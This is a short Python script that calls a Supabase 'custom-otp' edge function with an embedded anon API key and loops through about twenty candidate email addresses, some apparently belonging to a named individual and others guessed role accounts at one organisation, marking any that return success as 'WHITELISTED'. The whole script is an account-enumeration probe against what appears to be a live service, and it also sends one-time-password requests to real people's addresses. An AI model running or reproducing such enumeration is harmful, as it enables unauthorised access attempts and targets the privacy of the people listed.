import urllib.request, urllib.error, ssl, json

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()
def otp(email):
    r=urllib.request.Request(f"{BASE}/functions/v1/custom-otp", data=json.dumps({"email":email}).encode(), method="POST",
      headers={"apikey":ANON,"Authorization":f"Bearer {ANON}","Content-Type":"application/json"})
    try:
        resp=urllib.request.urlopen(r,timeout=20,context=ctx); return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return "ERR", str(e)

cands=[
 "d.vitali@reply.it","daniele@thesignalroom.org","daniele.vitali@reply.it",
 "vyrqelith@thesignalroom.org","vyrqelith@proton.me","vyrqelith@gmail.com","vyrqelith@mastodon.social",
 "nightlens_42@gmail.com","nightlens42@gmail.com",
 "admin@thesignalroom.org","member@thesignalroom.org","hello@thesignalroom.org","info@thesignalroom.org",
 "contact@thesignalroom.org","host@thesignalroom.org","demo@thesignalroom.org","test@thesignalroom.org",
 "guest@thesignalroom.org","daniele@reply.it","d.vitali@thesignalroom.org",
]
for e in cands:
    s,o=otp(e)
    mark = "  <<< WHITELISTED" if s==200 else ("  (rate)" if "wait" in o.lower() else "")
    print(f"{e:34} {s} {o[:80]}{mark}")
